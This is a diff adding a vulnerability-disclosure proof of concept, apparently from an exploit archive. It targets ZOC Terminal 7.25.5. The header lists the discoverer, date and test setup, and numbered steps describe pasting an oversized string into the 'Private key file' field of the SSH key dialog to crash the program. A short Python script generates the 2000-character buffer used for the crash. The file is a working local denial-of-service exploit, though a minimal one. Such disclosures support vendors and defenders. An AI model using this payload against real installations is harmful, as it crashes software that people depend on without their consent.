@@ -1,0 +1,22 @@
+# Exploit Title: ZOC Terminal v7.25.5 - 'Private key file' Denial of Service (PoC)
+# Discovery by: chuyreds
+# Discovery Date: 2020-04-05
+# Vendor Homepage: https://www.emtec.com
+# Software Link : http://www.emtec.com/downloads/zoc/zoc7255_x64.exe
+# Tested Version: 7.25.5
+# Vulnerability Type: Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to produce the crash:
+#1.- Run python code: ZOC_7.25.5_PrivateKeyFile.py
+#2.- Open ZOC_7.25.5_PrivateKeyFile.txt and copy content to clipboard
+#3.- Open ZOC Terminal
+#4.- Select File > Create SSH Key Files... 
+#5.- Select "Private key file:" field erease and Paste ClipBoard 
+#6.- Click on "Create public/private key files..."
+#7.- Crashed
+
+buffer = "\x41" * 2000
+f = open ("ZOC_7.25.5_PrivateKeyFile.txt", "w")
+f.write(buffer)
+f.close()
